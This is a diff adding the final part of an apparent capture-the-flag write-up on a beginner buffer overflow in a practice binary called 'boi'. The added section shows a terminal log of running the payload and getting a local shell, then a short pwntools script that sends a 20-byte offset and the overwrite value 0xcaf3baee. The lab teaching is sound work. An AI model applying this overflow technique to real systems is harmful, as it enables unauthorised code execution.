@@ -456,3 +456,49 @@ gef_  x/s $eax
 
 Now lets run the payload on the binary
 
+```
+                                                                                                                                                                                                                  
+┌──(mark__haxor)-[~/Documents/Pentest/BOF/03-begineer_bof]
+└─$ (cat input;cat) | ./boi
+Are you a big boiiiii??
+id
+uid=1000(mark) gid=1000(mark) groups=1000(mark),4(adm),20(dialout),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),109(netdev),119(wireshark),121(bluetooth),137(scanner),142(kaboxer)
+ls -al
+total 24
+drwxr-xr-x 2 mark mark 4096 Jan 29 15:14 .
+drwxr-xr-x 5 mark mark 4096 Jan 29 12:22 ..
+-rwxr-xr-x 1 mark mark 8792 Jan 29 12:22 boi
+-rw-r--r-- 1 mark mark   25 Jan 29 15:15 input
+```
+
+Cool we have shell xD
+
+Here's my exploit script
+
+```
+#imports all pwntool library
+from pwn import *
+
+#starts the binary
+io = process('./boi')
+
+#creates offset + address to overwrite the eax
+offset = b"A"*0x14
+addr = p64(0xcaf3baee)
+
+shell = offset + addr 
+
+#sends the overall exploit
+io.send(shell)
+
+#gives an interactive shell
+io.interactive()
+```
+
+And we're done 
+
+
+<br> <br>
+[Back To Home](../../index.md)
+<br>
+
